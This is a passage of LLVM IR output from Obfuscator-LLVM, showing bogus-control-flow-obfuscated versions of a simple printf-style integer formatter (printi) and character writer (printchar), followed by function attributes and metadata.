  %_ = sub i32 %207, %206
  %gen = mul i32 %_, %206
  %_11 = sub i32 0, %207
  %gen12 = add i32 %_11, %206
  %_13 = sub i32 0, %207
  %gen14 = add i32 %_13, %206
  %_15 = shl i32 %207, %206
  %_16 = sub i32 0, %207
  %gen17 = add i32 %_16, %206
  %208 = sub nsw i32 %207, %206
  store i32 %208, i32* %7, align 4
  br label %originalBB10

originalBB21alteredBB:                            ; preds = %originalBB21, %122
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %139
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %167
  %209 = load i8*, i8** %6, align 8
  %210 = getelementptr inbounds i8, i8* %209, i32 1
  store i8* %210, i8** %6, align 8
  br label %originalBB29
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = load i32, i32* @x.113
  %9 = load i32, i32* @y.114
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i32, align 4
  %17 = alloca i8**, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [12 x i8], align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i8** %0, i8*** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %30 = load i32, i32* %18, align 4
  store i32 %30, i32* %29, align 4
  %31 = load i32, i32* %18, align 4
  %32 = icmp eq i32 %31, 0
  %33 = load i32, i32* @x.113
  %34 = load i32, i32* @y.114
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %49

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %42, align 1
  %43 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %43, align 1
  %44 = load i8**, i8*** %17, align 8
  %45 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %46 = load i32, i32* %21, align 4
  %47 = load i32, i32* %22, align 4
  %48 = call i32 @prints(i8** %44, i8* %45, i32 %46, i32 %47)
  store i32 %48, i32* %16, align 4
  br label %182

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* @x.113
  %51 = load i32, i32* @y.114
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i32, i32* %20, align 4
  %59 = icmp ne i32 %58, 0
  %60 = load i32, i32* @x.113
  %61 = load i32, i32* @y.114
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %59, label %68, label %77

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i32, i32* %19, align 4
  %70 = icmp eq i32 %69, 10
  br i1 %70, label %71, label %77

; <label>:71:                                     ; preds = %68
  %72 = load i32, i32* %18, align 4
  %73 = icmp slt i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %71
  store i32 1, i32* %27, align 4
  %75 = load i32, i32* %18, align 4
  %76 = sub nsw i32 0, %75
  store i32 %76, i32* %29, align 4
  br label %77

; <label>:77:                                     ; preds = %74, %71, %68, %originalBBpart24
  %78 = load i32, i32* @x.113
  %79 = load i32, i32* @y.114
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %87 = getelementptr inbounds i8, i8* %86, i64 12
  %88 = getelementptr inbounds i8, i8* %87, i64 -1
  store i8* %88, i8** %25, align 8
  %89 = load i8*, i8** %25, align 8
  store i8 0, i8* %89, align 1
  %90 = load i32, i32* @x.113
  %91 = load i32, i32* @y.114
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %98

; <label>:98:                                     ; preds = %originalBBpart239, %originalBBpart28
  %99 = load i32, i32* %29, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %154

; <label>:101:                                    ; preds = %98
  %102 = load i32, i32* %29, align 4
  %103 = load i32, i32* %19, align 4
  %104 = urem i32 %102, %103
  store i32 %104, i32* %26, align 4
  %105 = load i32, i32* %26, align 4
  %106 = icmp sge i32 %105, 10
  br i1 %106, label %107, label %129

; <label>:107:                                    ; preds = %101
  %108 = load i32, i32* @x.113
  %109 = load i32, i32* @y.114
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %107
  %116 = load i32, i32* %23, align 4
  %117 = sub nsw i32 %116, 48
  %118 = sub nsw i32 %117, 10
  %119 = load i32, i32* %26, align 4
  %120 = add nsw i32 %119, %118
  store i32 %120, i32* %26, align 4
  %121 = load i32, i32* @x.113
  %122 = load i32, i32* @y.114
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart234, label %originalBB10alteredBB

originalBBpart234:                                ; preds = %originalBB10
  br label %129

; <label>:129:                                    ; preds = %originalBBpart234, %101
  %130 = load i32, i32* @x.113
  %131 = load i32, i32* @y.114
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %129
  %138 = load i32, i32* %26, align 4
  %139 = add nsw i32 %138, 48
  %140 = trunc i32 %139 to i8
  %141 = load i8*, i8** %25, align 8
  %142 = getelementptr inbounds i8, i8* %141, i32 -1
  store i8* %142, i8** %25, align 8
  store i8 %140, i8* %142, align 1
  %143 = load i32, i32* %19, align 4
  %144 = load i32, i32* %29, align 4
  %145 = udiv i32 %144, %143
  store i32 %145, i32* %29, align 4
  %146 = load i32, i32* @x.113
  %147 = load i32, i32* @y.114
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart239, label %originalBB36alteredBB

originalBBpart239:                                ; preds = %originalBB36
  br label %98

; <label>:154:                                    ; preds = %98
  %155 = load i32, i32* %27, align 4
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %157, label %174

; <label>:157:                                    ; preds = %154
  %158 = load i32, i32* %21, align 4
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %160, label %170

; <label>:160:                                    ; preds = %157
  %161 = load i32, i32* %22, align 4
  %162 = and i32 %161, 2
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %170

; <label>:164:                                    ; preds = %160
  %165 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %165, i32 45)
  %166 = load i32, i32* %28, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %28, align 4
  %168 = load i32, i32* %21, align 4
  %169 = add nsw i32 %168, -1
  store i32 %169, i32* %21, align 4
  br label %173

; <label>:170:                                    ; preds = %160, %157
  %171 = load i8*, i8** %25, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 -1
  store i8* %172, i8** %25, align 8
  store i8 45, i8* %172, align 1
  br label %173

; <label>:173:                                    ; preds = %170, %164
  br label %174

; <label>:174:                                    ; preds = %173, %154
  %175 = load i32, i32* %28, align 4
  %176 = load i8**, i8*** %17, align 8
  %177 = load i8*, i8** %25, align 8
  %178 = load i32, i32* %21, align 4
  %179 = load i32, i32* %22, align 4
  %180 = call i32 @prints(i8** %176, i8* %177, i32 %178, i32 %179)
  %181 = add nsw i32 %175, %180
  store i32 %181, i32* %16, align 4
  br label %182

; <label>:182:                                    ; preds = %174, %41
  %183 = load i32, i32* %16, align 4
  ret i32 %183

originalBBalteredBB:                              ; preds = %originalBB, %7
  %184 = alloca i32, align 4
  %185 = alloca i8**, align 8
  %186 = alloca i32, align 4
  %187 = alloca i32, align 4
  %188 = alloca i32, align 4
  %189 = alloca i32, align 4
  %190 = alloca i32, align 4
  %191 = alloca i32, align 4
  %192 = alloca [12 x i8], align 1
  %193 = alloca i8*, align 8
  %194 = alloca i32, align 4
  %195 = alloca i32, align 4
  %196 = alloca i32, align 4
  %197 = alloca i32, align 4
  store i8** %0, i8*** %185, align 8
  store i32 %1, i32* %186, align 4
  store i32 %2, i32* %187, align 4
  store i32 %3, i32* %188, align 4
  store i32 %4, i32* %189, align 4
  store i32 %5, i32* %190, align 4
  store i32 %6, i32* %191, align 4
  store i32 0, i32* %195, align 4
  store i32 0, i32* %196, align 4
  %198 = load i32, i32* %186, align 4
  store i32 %198, i32* %197, align 4
  %199 = load i32, i32* %186, align 4
  %200 = icmp eq i32 %199, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %201 = load i32, i32* %20, align 4
  %202 = icmp ne i32 %201, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %203 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %204 = getelementptr inbounds i8, i8* %203, i64 12
  %205 = getelementptr inbounds i8, i8* %204, i64 -1
  store i8* %205, i8** %25, align 8
  %206 = load i8*, i8** %25, align 8
  store i8 0, i8* %206, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %107
  %207 = load i32, i32* %23, align 4
  %_ = sub i32 %207, 48
  %gen = mul i32 %_, 48
  %208 = sub nsw i32 %207, 48
  %_11 = sub i32 0, %208
  %gen12 = add i32 %_11, 10
  %_13 = sub i32 %208, 10
  %gen14 = mul i32 %_13, 10
  %_15 = sub i32 %208, 10
  %gen16 = mul i32 %_15, 10
  %_17 = sub i32 %208, 10
  %gen18 = mul i32 %_17, 10
  %_19 = shl i32 %208, 10
  %209 = sub nsw i32 %208, 10
  %210 = load i32, i32* %26, align 4
  %_20 = shl i32 %210, %209
  %_21 = sub i32 %210, %209
  %gen22 = mul i32 %_21, %209
  %_23 = shl i32 %210, %209
  %_24 = sub i32 %210, %209
  %gen25 = mul i32 %_24, %209
  %_26 = sub i32 %210, %209
  %gen27 = mul i32 %_26, %209
  %_28 = sub i32 0, %210
  %gen29 = add i32 %_28, %209
  %_30 = sub i32 %210, %209
  %gen31 = mul i32 %_30, %209
  %_32 = shl i32 %210, %209
  %211 = add nsw i32 %210, %209
  store i32 %211, i32* %26, align 4
  br label %originalBB10

originalBB36alteredBB:                            ; preds = %originalBB36, %129
  %212 = load i32, i32* %26, align 4
  %213 = add nsw i32 %212, 48
  %214 = trunc i32 %213 to i8
  %215 = load i8*, i8** %25, align 8
  %216 = getelementptr inbounds i8, i8* %215, i32 -1
  store i8* %216, i8** %25, align 8
  store i8 %214, i8* %216, align 1
  %217 = load i32, i32* %19, align 4
  %218 = load i32, i32* %29, align 4
  %_37 = shl i32 %218, %217
  %219 = udiv i32 %218, %217
  store i32 %219, i32* %29, align 4
  br label %originalBB36
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }
attributes #12 = { noreturn }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146536019}
!2 = !{i32 -2146535328}
!3 = !{i32 -2146534579}
!4 = !{i32 -2146533869}
!5 = !{i32 -2146533051}
!6 = !{i32 -2146532160}
